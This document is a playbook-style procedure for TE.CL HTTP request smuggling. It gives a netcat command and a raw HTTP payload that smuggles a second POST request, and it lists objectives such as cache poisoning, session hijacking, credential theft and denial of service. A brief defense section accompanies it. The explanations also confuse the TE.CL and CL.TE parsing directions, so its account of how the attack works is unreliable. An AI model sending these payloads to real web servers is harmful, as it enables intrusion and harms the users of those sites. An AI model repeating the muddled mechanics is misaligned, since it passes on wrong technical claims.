---
type: procedure
description: >-
  Exploit discrepancies in HTTP request parsing between front-end and back-end
  servers using Transfer-Encoding: chunked and Content-Length headers to smuggle
  malicious requests.
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - request-smuggling
  - te-cl
  - web-vulnerability
commands:
  - '[[commands/nc-send-basic-te-cl-smuggling-request]]'
tools: []
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# TE-CL-Request-Smuggling

## Summary

TE.CL Request Smuggling is a variant of HTTP Request Smuggling that exploits differences in how front-end and back-end servers parse HTTP requests when both Content-Length and Transfer-Encoding: chunked headers are present. This procedure demonstrates how to craft and send smuggling requests to poison caches, hijack sessions, or bypass security controls in vulnerable web applications.

## Description

HTTP Request Smuggling occurs when there is a discrepancy in parsing HTTP requests between multiple systems, such as a load balancer and backend server. In the TE.CL variant, an attacker sends a request with both a Content-Length header and Transfer-Encoding: chunked, causing the front-end to process it one way (ignoring Transfer-Encoding due to Content-Length) while the back-end interprets it differently (honoring chunked encoding). This leads to the back-end misinterpreting subsequent legitimate requests as part of the smuggled payload, enabling attacks like cache poisoning, session fixation, or credential theft. This technique targets misconfigured HTTP proxies or application servers and is commonly tested against public-facing web apps.

## Requirements

1. Network access to the target web application (e.g., HTTP/HTTPS endpoint).
2. Knowledge of the target's HTTP parsing behavior (testable via tools like curl or Burp Suite).
3. Tools for sending raw HTTP requests, such as netcat (nc) or curl.
4. A vulnerable setup where the front-end rejects Transfer-Encoding when Content-Length is present, but the back-end does not.

## Defense

- Configure servers to reject requests containing both Content-Length and Transfer-Encoding headers (per RFC 7230).
- Deploy a Web Application Firewall (WAF) to detect and block anomalous header combinations or chunked smuggling patterns.
- Regularly scan for vulnerabilities using tools like those in OWASP ZAP or Burp Suite, and apply patches to web servers (e.g., nginx, Apache).
- Normalize HTTP requests at the edge to enforce consistent parsing.

## Objectives

1. Smuggle a malicious request to bypass front-end validation and execute on the back-end.
2. Poison response caches to deliver malicious content to other users.
3. Hijack user sessions or steal sensitive data by injecting unauthorized requests.
4. Achieve unauthorized access or denial of service on the target system.

## Instructions

### Step 1: Send Basic TE.CL Smuggling Request

**Context**: Craft a request that the front-end interprets using Content-Length (3 bytes), but the back-end uses chunked encoding to consume only the chunked body, leaving the smuggled payload for the next request. This tests if the server is vulnerable to basic smuggling.

**Command** ([[commands/nc-send-basic-te-cl-smuggling-request]]):
```bash
echo -e "POST / HTTP/1.1\r\nHost: $_TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n" | nc $_TARGET 80
```

> This command uses netcat to send a raw HTTP request to the target. The Content-Length: 3 causes the front-end to read only 3 bytes after the headers, but the back-end ignores Content-Length and processes the chunked body (hex 8 for "SMUGGLED", followed by empty chunk 0). If vulnerable, the next legitimate request will prepend "SMUGGLED" to its body on the back-end.

**Expected Output**: A 200 OK or similar response from the server, but no immediate error. Follow up with a legitimate POST request (e.g., via browser) and check if the response body includes "SMUGGLED" or altered behavior, indicating successful smuggling.

### Step 2: Send TE.CL Smuggling with Injected POST Request

**Context**: Extend the basic attack by smuggling a full secondary request (e.g., a POST) within the chunked body. This allows injecting actions like form submissions or resource access that bypass authentication.

**Code** ([[codes/te-cl-smuggling-with-injected-post-payload]]):

Use the following HTTP payload, sent via a similar netcat command or Burp Repeater:

```http
POST / HTTP/1.1
Host: $_TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0

```

> The chunk size 5c (92 in decimal) includes the smuggled "GPOST / HTTP/1.1..." request. The front-end reads 4 bytes per Content-Length, but the back-end processes the full chunk, smuggling the POST (which might be interpreted as a GET/POST hybrid depending on parsing). Adjust the chunk size (hex) to match the smuggled request length. Send this, then issue a follow-up request to observe the injected action's effects, such as unauthorized parameter submission (x=1).

**Expected Output**: Server accepts the request without error. Subsequent requests show signs of smuggling, like unexpected form processing, cache entries with injected data, or session changes. Use server logs or proxy interception to verify the back-end received the smuggled POST.
